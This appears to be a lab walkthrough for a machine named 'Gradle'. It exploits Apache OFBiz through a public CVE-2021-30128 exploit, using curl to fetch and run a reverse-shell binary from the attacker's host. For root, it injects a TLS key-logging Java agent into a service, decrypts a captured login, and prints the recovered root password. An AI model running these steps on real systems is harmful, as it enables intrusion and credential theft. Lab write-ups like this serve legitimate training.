@@ -1,0 +1,295 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.228.251 > Gradle.txt
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 cf:88:54:c8:fd:49:d3:dc:3d:d8:d1:a8:41:cb:5f:df (RSA)
+|   256 7d:04:94:3d:ca:96:78:55:dc:55:a4:03:13:fc:98:19 (ECDSA)
+|_  256 2a:b5:e8:7a:16:a7:84:c0:97:bd:8f:fe:5b:38:23:5f (ED25519)
+80/tcp   open  http     Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+8443/tcp open  ssl/http Apache Tomcat 9.0.36
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| ssl-cert: Subject: commonName=gradle.pg/organizationName=Gradle/stateOrProvinceName=NY/countryName=US
+| Issuer: commonName=gradle.pg/organizationName=Gradle/stateOrProvinceName=NY/countryName=US
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-03-23T12:38:20
+| Not valid after:  2033-03-20T12:38:20
+| MD5:     13c2 4f0d 4829 127c f13f 34f9 a774 ebbe
+| SHA-1:   ef27 8fb4 dc4b 4f3c fa2a 1ca2 24d0 d051 7cbf f863
+|_SHA-256: 97e9 c2fa 61e7 1546 2563 c2c7 080b ca45 3cf1 ed1a f765 9bcb cd9e bc21 a89c 471d
+| http-title: 500 Internal error
+|_Requested resource was /accounting/control/main
+|_ssl-date: TLS randomness does not represent time
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+https://192.168.228.251:8443
+org.apache.ofbiz.webapp.control.RequestHandlerException: Domain 192.168.228.251 not accepted to prevent host header injection. You need to set host-headers-allowed property in security.properties file.
+
+https://gradle.pg:8443/webtools
+For something interesting make sure you are logged in, try username: admin, password: ofbiz.
+
+https://gradle.pg:8443
+Copyright (c) 2001-2026 The Apache Software Foundation. Powered by Apache OFBiz. Release 17.12.05 
+
+https://github.com/LioTree/CVE-2021-30128-EXP
+
+$ python exp.py -u https://gradle.pg:8443 -c "curl http://192.168.45.161/shell.elf -o /tmp/shell.elf"
+$ python exp.py -u https://gradle.pg:8443 -c "chmod +x /tmp/shell.elf"
+$ python exp.py -u https://gradle.pg:8443 -c "/tmp/shell.elf"
+
+$ rlwrap nc -nlvp 8443
+listening on [any] 8443 ...
+connect to [192.168.45.161] from (UNKNOWN) [192.168.228.251] 51806
+id
+uid=1000(david) gid=1000(david) groups=1000(david)
+
+david@gradle:/home$ sudo -l
+sudo -l
+Matching Defaults entries for david on gradle:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User david may run the following commands on gradle:
+    (ALL) NOPASSWD: /usr/sbin/tcpdump -w /tmp/*.pcap -ni lo
+david@gradle:/home$ sudo /usr/sbin/tcpdump -w /tmp/test.pcap -ni lo
+# wait a while
+david@gradle:~$ tshark -r /tmp/dump.pcap
+
+https://jsslkeylog.github.io/
+# From walkthrough Privilege Escalation
+Packet Capture
+We capture an internal packet using tcpdump with sudo. Let's see who else is currently accessing this application.
+
+david@gradle:~$ sudo -l
+Matching Defaults entries for david on gradle:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:...
+
+User david may run the following commands on gradle:
+    (ALL) NOPASSWD: /usr/sbin/tcpdump -w /tmp/*.pcap -ni lo
+david@gradle:~$ ls -l
+total 28
+-rw-r--r--  1 david david    9 Dec 15 18:34 VERSION
+drwxr-xr-x 14 david david 4096 Dec 15 18:33 applications
+drwxr-xr-x 10 david david 4096 Dec 15 18:34 runtime
+...
+david@gradle:~$ ls -l runtime/
+total 32
+drwxr-xr-x 3 david david 4096 Dec 15 18:34 catalina
+drwxr-xr-x 2 david david 4096 Dec 15 22:00 logs
+drwxr-xr-x 2 david david 4096 Dec 15 18:34 tmp
+...
+david@gradle:~$ ls -l runtime/logs/
+total 3452
+-rw-r--r-- 1 david david    9851 Dec 15 22:30 access_log..2022-12-15
+-rw-r--r-- 1 david david   29972 Dec 15 21:59 error.log
+-rw-r--r-- 1 david david  453643 Dec 15 22:30 ofbiz.log
+...
+david@gradle:~$ tail -f runtime/logs/access_log..2022-12-15
+...
+127.0.0.1 - - [15/Dec/2022:22:30:01 +0700] "GET /accounting/control/main HTTP/1.1" 200 10536 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+127.0.0.1 - - [15/Dec/2022:22:30:02 +0700] "POST /accounting/control/login HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+127.0.0.1 - - [15/Dec/2022:22:30:02 +0700] "GET /accounting/control/main HTTP/1.1" 200 29969 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+
+david@gradle:~$ date
+Thu Dec 15 22:34:45 WIB 2022
+We see that someone using Mozilla Windows 10 logged in almost 5 minutes ago. Let's run tcpdump to capture the packet.
+
+david@gradle:~$ sudo tcpdump -w /tmp/dump.pcap -ni lo
+tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+After a few moments the dump packet is written with 93 packets captured.
+
+david@gradle:~$ sudo tcpdump -w /tmp/dump.pcap -ni lo
+tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+^C93 packets captured
+186 packets received by filter
+0 packets dropped by kernel
+david@gradle:~$ ls -l /tmp/dump.pcap
+-rw-r--r-- 1 root root 57344 Dec 15 22:35 /tmp/dump.pcap
+Fortunately the Wireshark command line tshark is installed on the machine, and can be used to inspect the dump file.
+
+david@gradle:~$ tshark -r /tmp/dump.pcap
+...
+4   0.001136    127.0.0.1 ? 127.0.0.1    TLSv1 583 Client Hello
+...
+8   0.005037    127.0.0.1 ? 127.0.0.1    TLSv1.3 589 Change Cipher Spec, Client Hello
+9   0.025552    127.0.0.1 ? 127.0.0.1    TLSv1.3 226 Server Hello
+10   0.025625    127.0.0.1 ? 127.0.0.1    TLSv1.3 72 Change Cipher Spec
+11   0.025856    127.0.0.1 ? 127.0.0.1    TCP 66 46746 ? 8443 [ACK] Seq=1041 Ack=365...
+12   0.026101    127.0.0.1 ? 127.0.0.1    TLSv1.3 1418 Application Data
+13   0.027267    127.0.0.1 ? 127.0.0.1    TLSv1.3 140 Application Data
+14   0.027351    127.0.0.1 ? 127.0.0.1    TLSv1.3 293 Application Data
+...
+david@gradle:~$ tshark -q -r /tmp/dump.pcap
+david@gradle:~$ tshark -q -r /tmp/dump.pcap -T fields -e frame.protocols | sort -u
+eth:ethertype:ip:tcp
+eth:ethertype:ip:tcp:ssl
+From the output we see an encrypted tcp and ssl protocol.
+
+SSL Session Logging
+Technically having access to the application private key can be used to decrypt the data but because it uses TLSv1.3 which enables PFS by default, it's not possible.
+
+However, more technologies are adopting SSL Key Logging for the ephemeral keys on either client or server side. Google search for Java SSL Log will lead here and with access to the application process, server side logging is possible.
+
+Let's download, extract, and host the Jar file.
+
+kali@kali:~$ wget https://github.com/jsslkeylog/jsslkeylog/releases/download/v1.3.0/jSSLKeyLog-1.3.zip
+--2022-12-15 22:37:19--  https://github.com/jsslkeylog/jsslkeylog/releases/download/v1.3.0/jSSLKeyLog-1.3.zip
+Resolving github.com (github.com)... 20.205.243.166
+Connecting to github.com (github.com)|20.205.243.166|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/... [following]
+Length: 142914 (140K) [application/octet-stream]
+...
+Saving to: ‘jSSLKeyLog-1.3.zip’
+
+jSSLKeyLog-1.3.zip      100%[=================================================>] 139.56K   939KB/s    in 0.2s
+...
+
+kali@kali:~$ unzip jSSLKeyLog-1.3.zip
+Archive:  jSSLKeyLog-1.3.zip
+  inflating: jSSLKeyLog.jar
+  inflating: license.txt
+  inflating: README.txt
+kali@kali:~$ python3 -m http.server 8443
+Serving HTTP on 0.0.0.0 port 8443 ...
+Now we download the Jar file to /tmp on the target machine using wget.
+
+david@gradle:~$ wget http://192.168.120.3:8443/jSSLKeyLog.jar -P /tmp
+--2022-12-15 22:37:49--  http://192.168.120.3:8443/jSSLKeyLog.jar
+Connecting to 192.168.120.3:8443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 144993 (142K) [application/java-archive]
+Saving to: '/tmp/jSSLKeyLog.jar'
+
+jSSLKeyLog.jar          100%[=================================================>] 141.59K  --.-KB/s    in 0.005s
+Next, we modify the Java process arguments to invoke this Jar file. Let's find the process and its configuration files.
+
+david@gradle:~$ ps ux | grep java
+david 488 0.5 27.3 3108896 551232 ? Ssl Dec15 7:01 /usr/lib/jvm/adoptopenjdk-8-hotspot-amd64/bin/java 
+  -Xms128M -Xmx1024M -Dfile.encoding=US-ASCII -Duser.country=US -Duser.language=en -Duser.variant
+  ... org.apache.ofbiz.base.start.Start
+david@gradle:~$ grep -nR org.apache.ofbiz.base.start.Start /etc/* 2>/dev/null
+david@gradle:~$ grep -nR /usr/lib/jvm/adoptopenjdk-8-hotspot-amd64/bin/java /etc/* 2>/dev/null
+david@gradle:~$
+There are no configuration files containing the process however as the process runs as david we can kill the process and should be able to quickly spawn a new process with new arguments. But if this process is controlled by Systemd then it may immediately respawn.
+
+david@gradle:~$ ps ux | grep java
+david 488 0.5 27.3 3108896 551232 ? Ssl Dec15 7:01 /usr/lib/jvm/adoptopenjdk-8-hotspot-amd64/bin/java 
+  -Xms128M -Xmx1024M -Dfile.encoding=US-ASCII -Duser.country=US -Duser.language=en -Duser.variant
+  ... org.apache.ofbiz.base.start.Start
+david@gradle:~$ kill -2 488
+david@gradle:~$ ps ux | grep java
+david 4198 16 11.2 2986316 227716 ? Ssl 22:38 0:09 /usr/lib/jvm/adoptopenjdk-8-hotspot-amd64/bin/java 
+  -Xms128M -Xmx1024M -Dfile.encoding=US-ASCII -Duser.country=US -Duser.language=en -Duser.variant
+  ... org.apache.ofbiz.base.start.Start
+After sending an interrupt signal the process respawned with a different PID. If we keep doing this will cause an address in use error. However, The Systemd configuration file ends with .service. Let's specifically search for the .service extension.
+
+david@gradle:~$ find / -type f -name *ofbiz*.service -ls 2>/dev/null
+139597 4 -rw-r--r-- 1 david david 394 Dec 15 18:34 /home/david/.config/systemd/user/apache-ofbiz.service
+david@gradle:~$ ls -l .config/systemd/user/
+total 8
+-rw-r--r-- 1 david david  394 Dec 15 18:34 apache-ofbiz.service
+drwxr-xr-x 2 david david 4096 Dec 15 18:34 default.target.wants
+david@gradle:~$ cat .config/systemd/user/apache-ofbiz.service
+[Unit]
+Description=Apache Ofbiz
+
+[Service]
+Type=simple
+ExecStart=/usr/lib/jvm/adoptopenjdk-8-hotspot-amd64/bin/java \
+  -Xms128M \
+  -Xmx1024M \
+  -Dfile.encoding=US-ASCII \
+  -Duser.country=US \
+  -Duser.language=en \
+  -Duser.variant \
+  -cp /usr/src/apache-ofbiz/build/libs/ofbiz.jar org.apache.ofbiz.base.start.Start
+StartLimitBurst=0
+Restart=on-failure
+...
+The configuration file is in front of us this whole time because it turns out the Systemd offers the ability to manage services under user's control with --user option.
+
+Let's modify the configuration, add the -javaagent option, reload and restart.
+
+david@gradle:~$ vim .config/systemd/user/apache-ofbiz.service
+david@gradle:~$ cat .config/systemd/user/apache-ofbiz.service
+...
+[Service]
+Type=simple
+ExecStart=/usr/lib/jvm/adoptopenjdk-8-hotspot-amd64/bin/java \
+  -javaagent:/tmp/jSSLKeyLog.jar==/tmp/jssl-key.log \
+  -Xms128M \
+...
+david@gradle:~$ systemctl --user daemon-reload
+david@gradle:~$ systemctl --user restart apache-ofbiz.service
+david@gradle:~$ ps ux | grep java
+david 4505 91.6 6.6 2962432 133288 ? Ssl 22:37 0:02 /usr/lib/jvm/adoptopenjdk-8-hotspot-amd64/bin/java
+  -javaagent:/tmp/jSSLKeyLog.jar==/tmp/jssl-key.log
+  -Xms128M -Xmx1024M... org.apache.ofbiz.base.start.Start
+...
+david@gradle:~$ ls -l /tmp/jssl-key.log
+-rw-r--r-- 1 david david 81 Dec 15 22:38 /tmp/jssl-key.log
+david@gradle:~$ cat /tmp/jssl-key.log
+## 2022-12-15 22:38:00.742
+# SSL/TLS secrets log file, generated by jSSLKeyLog
+The Java process now respawns with an additional javaagent option. Let's run the tcpdump to capture packets once more.
+
+david@gradle:~$ sudo tcpdump -w /tmp/dump2.pcap -ni lo
+tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+After a few minutes someone eventually logs in again, 111 packets are captured and the files size has increased.
+
+david@gradle:~$ sudo tcpdump -w /tmp/dump2.pcap -ni lo
+tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+^C111 packets captured
+222 packets received by filter
+0 packets dropped by kernel
+david@gradle:~$ ls -l /tmp/dump2.pcap
+-rw-r--r-- 1 root root 60600 Dec 15 22:40 /tmp/dump2.pcap
+david@gradle:~$ ls -l /tmp/jssl-key.log
+-rw-r--r-- 1 david david 957 Dec 15 22:40 /tmp/jssl-key.log
+Let's extract the dump2 file and combine it with the jssl-key.log file and follow the tcp stream.
+
+david@gradle:~$ tail -f runtime/logs/access_log..2022-12-15
+...
+127.0.0.1 - - [15/Dec/2022:22:40:01 +0700] "GET /accounting/control/main HTTP/1.1" 200 10536 ...
+127.0.0.1 - - [15/Dec/2022:22:40:02 +0700] "POST /accounting/control/login HTTP/1.1" 302 - "-" ...
+127.0.0.1 - - [15/Dec/2022:22:40:02 +0700] "GET /accounting/control/main HTTP/1.1" 200 29969 "-" ...
+david@gradle:~$ tshark -q -r /tmp/dump2.pcap -Y ssl -T fields -e tcp.stream | sort -u
+4
+5
+6
+There are 3 tcp streams: 4,5,6 which match the access log so the first stream is the first GET request. Let's follow the second stream: 5 which is the POST request that will contain the data.
+
+david@gradle:~$ tshark -q -o ssl.keylog_file:/tmp/jssl-key.log -r /tmp/dump2.pcap -z follow,ssl,ascii,5
+
+===================================================================
+Follow: ssl,ascii
+Filter: tcp.stream eq 5
+Node 0: 127.0.0.1:8443
+Node 1: :0
+        418
+POST /accounting/control/login HTTP/1.1
+Host: gradle.pg:8443
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72...
+Accept: */*
+Cookie: JSESSIONID=E68A58499FF311D5D1D1CF0F7F574D6C.jvm1; OFBiz.Visitor=10900
+Content-Length: 63
+Content-Type: application/x-www-form-urlencoded
+
+USERNAME=root&PASSWORD=WinIslandCallHook940&JavaScriptEnabled=Y
+...
+HTTP/1.1 302
+Set-Cookie: JSESSIONID=8A98FB31DB3CD97DE365C4263C10DF1F.jvm1; Path=/accounting; Secure; HttpOnly; ...
+Location: https://gradle.pg:8443/accounting/control/main
+...
+
+$ ssh root@192.168.228.251
+root:WinIslandCallHook940
+root@gradle:~# id
+uid=0(root) gid=0(root) groups=0(root)
